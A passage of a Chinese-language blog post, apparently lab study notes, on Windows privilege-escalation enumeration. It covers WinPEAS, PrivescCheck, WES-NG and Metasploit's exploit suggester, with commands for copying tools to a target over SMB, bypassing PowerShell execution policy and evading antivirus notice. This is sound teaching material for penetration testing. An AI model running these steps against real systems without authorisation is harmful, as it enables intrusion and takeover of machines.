<p>这表明 <code>VulnerableService</code> 以 <strong>SYSTEM 权限</strong> 运行，并且路径可修改，意味着可以替换 <code>service.exe</code>，从而获取 SYSTEM 访问权限。</p>
<p><strong>其他 Privilege Escalation 工具</strong></p>
<p>除了 WinPEAS，以下工具也常用于 Windows 权限提升检查：</p>
<ul>
<li><strong>PowerUp</strong>（适用于 PowerShell）</li>
<li><strong>Seatbelt</strong>（C# 版本的权限提升枚举）</li>
<li><strong>SharpUp</strong>（用于 .NET 环境）</li>
<li><strong>Windows Exploit Suggester</strong>（检查已知漏洞）</li>
</ul>
<p>工具:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/peass-ng/PEASS-ng/releases/latest/</span><br></pre></td></tr></table></figure>

<p>当然不只是win可以使用着一些相关工具还有linux</p>
<p>实践</p>
<p>win:</p>
<p>直接在攻击机上开一个smb把 WinPEAS传到目标机上即可</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250320222935478.png" alt="image-20250320222935478"></p>
<p>net use Z: \192.168.106.128\public &#x2F;user:1 1或则</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250320223002426.png" alt="image-20250320223002426"></p>
<p>linux:</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250320224347438.png" alt="image-20250320224347438"></p>
<p>PEASS-ng 支持将检测的导出结果转换为 json、html、pdf 等格式的报告。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">项目地址：https://github.com/mnemonic-re/parsePEASS/tree/Scripts/parsePEASS/parsers</span><br></pre></td></tr></table></figure>

<p>首先将 PEASS-ng 的检测结果导出到文件中，可以使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux/Unix*/MacOS环境：</span><br><span class="line">    ./linpeas.sh &gt; result.txt</span><br><span class="line">Windows环境：</span><br><span class="line">    winPEAS.bat &gt; result.txt</span><br><span class="line">    winPEASany.exe log=result.txt</span><br><span class="line">然后使用 peas2json.py 将检测结果导出的文件转化为 json 格式文件。</span><br><span class="line">python3 peas2json.py result.txt peass.json</span><br><span class="line">最后将 json 格式文件转化为 html 或者 pdf 格式报告。</span><br><span class="line">python3 json2html.py peass.json peass.html</span><br><span class="line">python3 json2pdf.py peass.json peass.pdf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="PrivescCheck-钥匙链检查"><a href="#PrivescCheck-钥匙链检查" class="headerlink" title="PrivescCheck 钥匙链检查"></a>PrivescCheck 钥匙链检查</h4><p>PrivescCheck 是一个 PowerShell 脚本，用于搜索目标系统上的常见权限提升。它提供了 WinPEAS 的替代方案，而无需执行二进制文件。</p>
<p>PrivescCheck 可以<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">在这里</a>下载。</p>
<p><strong>提醒</strong>：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用 <code>Set-ExecutionPolicy</code> cmdlet，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">. .\PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object &quot;C:\Temp\result.txt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20250321173821025.png" alt="image-20250321173821025"></p>
<h4 id="ES-NG：Windows-漏洞利用建议器-下一代"><a href="#ES-NG：Windows-漏洞利用建议器-下一代" class="headerlink" title="ES-NG：Windows 漏洞利用建议器 - 下一代"></a>ES-NG：Windows 漏洞利用建议器 - 下一代</h4><p>一些漏洞利用建议脚本（例如 winPEAS）会要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为避免发出不必要的噪音而引起注意，您可能更喜欢使用 WES-NG，它将在您的攻击机器（例如 Kali 或 TryHackMe AttackBox）上运行。WES-NG 是一个 Python 脚本，可以<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">在此处</a>找到和下载</p>
<p>安装后，在使用之前，键入 <code>wes.py --update</code> 命令以更新数据库。该脚本将引用它创建的数据库，以检查是否存在缺失的补丁，这些补丁可能会导致漏洞，您可以使用它来提升目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行 <code>systeminfo</code> 命令。不要忘记将输出定向到您需要移动到攻击机器的 .txt 文件。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250321182257778.png" alt="image-20250321182257778"></p>
<p>在攻击机开个smb服务</p>
<p>把txt文件传到攻击机即可</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183547761.png" alt="image-20250321183547761"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183601388.png" alt="image-20250321183601388"></p>
<p>完成此作后，wes.py 可以按如下方式运行;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wes.py systeminfo.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20250321183617871.png" alt="image-20250321183617871"></p>
<h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h4><p>如果您在目标系统上已经有 Meterpreter shell，则可以使用该 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞，并允许您提升在目标系统上的权限。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/20/win%E6%8F%90%E6%9D%83/">http://example.com/2025/03/20/win%E6%8F%90%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/04/01/%E7%BA%A2%E9%98%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-one/" title="红队学习笔记-one"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">红队学习笔记-one</div></div><div class="info-2"><div class="info-item-1">红队基础知识漏洞评估和渗透测试限制漏洞评估这是最简单的安全评估形式，其主要目标是在网络中尽可能多的系统中识别尽可能多的漏洞。为此，可以做出让步以有效地实现这一目标。例如，攻击者的计算机可能在可用的安全解决方案中被列入允许列表，以避免干扰漏洞发现过程。这是有道理的，因为目标是查看网络上的每台主机并单独评估其安全状况，同时向公司提供关于修复工作重点的最多信息。 总而言之， 漏洞评估的重点是将主机作为单个实体进行漏洞扫描，以便识别安全缺陷并部署有效的安全措施，以优先方式保护网络。大部分工作可以使用自动化工具完成，并由作员执行，不需要太多的技术知识。 例如，如果要通过网络运行漏洞评估...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#win%E7%9A%84%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">win的提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E9%80%9A%E5%B8%B8%E7%9A%84%E4%BD%8D%E7%BD%AE%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">从通常的位置收集密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">远程连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E5%8E%86%E5%8F%B2"><span class="toc-number">1.1.2.</span> <span class="toc-text">Powershell历史</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E7%9A%84-Windows-%E5%87%AD%E6%8D%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">保存的 Windows 凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PuTTY"><span class="toc-number">1.1.4.</span> <span class="toc-text">PuTTY</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%BF%AB%E9%80%9F%E8%8E%B7%E8%83%9C"><span class="toc-number">1.2.</span> <span class="toc-text">其他快速获胜</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Scheduled-Tasks-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Scheduled Tasks 计划任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AlwaysInstallElevated-%E5%A7%8B%E7%BB%88%E5%AE%89%E8%A3%85%E6%8F%90%E5%8D%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">AlwaysInstallElevated 始终安装提升</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Service-Misconfigurations%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.3.</span> <span class="toc-text">Abusing Service Misconfigurations滥用服务配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">对服务可执行文件的不安全权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">1.3.2.</span> <span class="toc-text">未加引号的服务路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">不安全的服务权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-dangerous-privileges%E6%BB%A5%E7%94%A8%E5%8D%B1%E9%99%A9%E6%9D%83%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text">Abusing dangerous privileges滥用危险权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SeBackup-SeRestore"><span class="toc-number">1.4.1.</span> <span class="toc-text">SeBackup &#x2F; SeRestore</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E5%85%85Pass-the-Hash-Pass-The-Ticket"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">补充Pass-the-Hash,Pass The Ticket</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeTakeOwnership"><span class="toc-number">1.4.2.</span> <span class="toc-text">SeTakeOwnership</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeImpersonate-SeAssignPrimaryToken"><span class="toc-number">1.4.3.</span> <span class="toc-text">SeImpersonate &#x2F; SeAssignPrimaryToken</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-RogueWinRM-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E8%A1%8C%EF%BC%9F"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">🔹 RogueWinRM 为什么可行？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1-RogueWinRM%EF%BC%9F"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">🔹 如何防御 RogueWinRM？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%F0%9F%94%B9-%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">🔹 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-vulnerable-software-%E6%BB%A5%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.5.</span> <span class="toc-text">Abusing vulnerable software(滥用易受攻击的软件)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unpatched-Software-%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text">Unpatched Software 未修补的软件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6%EF%BC%9ADruva-inSync-6-6-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">案例研究：Druva inSync 6.6.3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools-of-the-Trade-%E5%8F%91%E7%8E%B0%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.</span> <span class="toc-text">Tools of the Trade 发现工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WinPEAS"><span class="toc-number">1.6.1.</span> <span class="toc-text">WinPEAS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PrivescCheck-%E9%92%A5%E5%8C%99%E9%93%BE%E6%A3%80%E6%9F%A5"><span class="toc-number">1.6.2.</span> <span class="toc-text">PrivescCheck 钥匙链检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ES-NG%EF%BC%9AWindows-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BB%BA%E8%AE%AE%E5%99%A8-%E4%B8%8B%E4%B8%80%E4%BB%A3"><span class="toc-number">1.6.3.</span> <span class="toc-text">ES-NG：Windows 漏洞利用建议器 - 下一代</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.6.4.</span> <span class="toc-text">Metasploit</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Matrioshka/" title="hackmyvm_Matrioshka">hackmyvm_Matrioshka</a><time datetime="2025-05-29T13:29:07.000Z" title="发表于 2025-05-29 21:29:07">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04">hackmyvm_dc04</a><time datetime="2025-05-29T13:28:50.000Z" title="发表于 2025-05-29 21:28:50">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc01/" title="hackmyvm_dc01">hackmyvm_dc01</a><time datetime="2025-05-29T13:28:45.000Z" title="发表于 2025-05-29 21:28:45">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always">hackmyvm_always</a><time datetime="2025-05-29T13:28:35.000Z" title="发表于 2025-05-29 21:28:35">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>